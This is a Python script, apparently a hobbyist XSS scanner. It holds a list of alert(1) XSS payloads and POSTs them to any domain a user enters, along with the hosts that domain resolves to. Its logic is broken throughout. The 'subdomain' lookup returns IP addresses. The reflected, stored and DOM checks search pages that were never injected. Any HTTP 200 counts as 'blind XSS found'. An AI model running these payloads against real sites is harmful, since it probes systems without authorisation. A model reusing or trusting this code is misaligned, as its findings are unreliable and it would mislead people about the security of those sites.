#!/usr/bin/env python3  # Shebang for Linux users to run the script directly

import requests
from bs4 import BeautifulSoup
import re
import pyfiglet
import dns.resolver  # For subdomain discovery

# Define XSS payloads to test
xss_payloads = [
    '<img src="x" onerror="alert(1)">',
    '<script>alert(1)</script>',
    '<a href="javascript:alert(1)">Click Me</a>',
    '"><script>alert(1)</script>',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    '"><img src="x" onerror="alert(1)">',
    '<body onload="alert(1)">',
    '" onmouseover="alert(1)">',
    '<div style="background:url(javascript:alert(1))">x</div>',
    '<input type="text" value="x" onfocus="alert(1)">'
]

# XSS Types
xss_types = {
    'reflected': 'Reflected XSS found',
    'stored': 'Stored XSS found',
    'blind': 'Blind XSS found',
    'dom': 'DOM XSS found'
}

def print_sudo_su_logo():
    """Generate and display the 'sudo su' logo using pyfiglet"""
    ascii_art = pyfiglet.figlet_format("sudo su", font="slant")  # 'sudo su' ASCII art
    print(ascii_art)

def get_html(url):
    """Fetch HTML content of the target URL"""
    try:
        response = requests.get(url, timeout=10)  # Added timeout to avoid hanging
        response.raise_for_status()
        return response.text
    except requests.exceptions.RequestException as e:
        print(f"Error fetching URL {url}: {e}")
        return None

def get_subdomains(domain):
    """Get subdomains of the domain using DNS resolver"""
    subdomains = []
    resolver = dns.resolver.Resolver()
    resolver.nameservers = ['8.8.8.8', '8.8.4.4']  # Use Google's public DNS
    resolver.timeout = 10  # Timeout after 10 seconds
    resolver.lifetime = 10  # Set lifetime to 10 seconds
    
    try:
        # Query DNS for subdomains
        answers = resolver.resolve(domain, 'A')
        for answer in answers:
            subdomains.append(answer.to_text())
    except (dns.resolver.NoAnswer, dns.resolver.NXDOMAIN):
        print(f"No subdomains found for {domain}")
    except dns.resolver.LifetimeTimeout:
        print(f"DNS resolution timed out while resolving {domain}")
    return subdomains

def check_reflected_xss(html, payload):
    """Check for reflected XSS in the page content"""
    if payload in html:
        return True
    return False

def check_stored_xss(html, payload):
    """Check for stored XSS in form inputs and URLs"""
    soup = BeautifulSoup(html, 'html.parser')
    for tag in soup.find_all(['input', 'a', 'img', 'script', 'iframe']):
        if tag.get('href') and payload in tag['href']:
            return True
        if tag.get('src') and payload in tag['src']:
            return True
        if tag.get('value') and payload in tag['value']:
            return True
    return False

def check_blind_xss(url, payload):
    """Simulate Blind XSS by sending POST requests with payload"""
    data = {'input': payload}
    try:
        response = requests.post(url, data=data, timeout=10)
        if response.status_code == 200:
            return True
    except requests.exceptions.RequestException as e:
        print(f"Error sending payload to {url}: {e}")
    return False

def check_dom_xss(html, payload):
    """Check for DOM-based XSS in page elements"""
    soup = BeautifulSoup(html, 'html.parser')
    for tag in soup.find_all(['script', 'a', 'img', 'iframe']):
        if payload in str(tag):
            return True
    return False

def analyze_url(url):
    """Analyze the given URL for XSS vulnerabilities"""
    print(f"Checking {url} for XSS vulnerabilities...")
    html = get_html(url)
    if not html:
        return

    found_xss = {
        'reflected': [],
        'stored': [],
        'blind': [],
        'dom': []
    }

    # Check for reflected XSS
    for payload in xss_payloads:
        if check_reflected_xss(html, payload):
            found_xss['reflected'].append(payload)

    # Check for stored XSS
    for payload in xss_payloads:
        if check_stored_xss(html, payload):
            found_xss['stored'].append(payload)

    # Check for blind XSS
    for payload in xss_payloads:
        if check_blind_xss(url, payload):
            found_xss['blind'].append(payload)

    # Check for DOM-based XSS
    for payload in xss_payloads:
        if check_dom_xss(html, payload):
            found_xss['dom'].append(payload)

    # Display findings
    if found_xss['reflected']:
        print(f"{xss_types['reflected']} in {url}: {found_xss['reflected']}")
    else:
        print(f"No Reflected XSS found in {url}.")

    if found_xss['stored']:
        print(f"{xss_types['stored']} in {url}: {found_xss['stored']}")
    else:
        print(f"No Stored XSS found in {url}.")

    if found_xss['blind']:
        print(f"{xss_types['blind']} in {url}: {found_xss['blind']}")
    else:
        print(f"No Blind XSS found in {url}.")

    if found_xss['dom']:
        print(f"{xss_types['dom']} in {url}: {found_xss['dom']}")
    else:
        print(f"No DOM-based XSS found in {url}.")

def analyze_subdomains(domain):
    """Analyze the given domain and its subdomains for XSS vulnerabilities"""
    subdomains = get_subdomains(domain)

    if not subdomains:
        print("No subdomains found for analysis.")
        return

    print(f"Analyzing subdomains of {domain}...")
    # Analyze the main domain
    analyze_url(f"http://{domain}")
    analyze_url(f"https://{domain}")

    # Analyze each subdomain
    for subdomain in subdomains:
        print(f"\nAnalyzing subdomain: {subdomain}")
        analyze_url(f"http://{subdomain}")
        analyze_url(f"https://{subdomain}")

# Main script execution
if __name__ == "__main__":
    print_sudo_su_logo()  # Display the custom "sudo su" ASCII art

    # Ask for domain input from the user
    domain_input = input("Enter a domain to check for XSS vulnerabilities (e.g., example.com): ")

    # Call the function to check for XSS vulnerabilities on the domain and its subdomains
    analyze_subdomains(domain_input)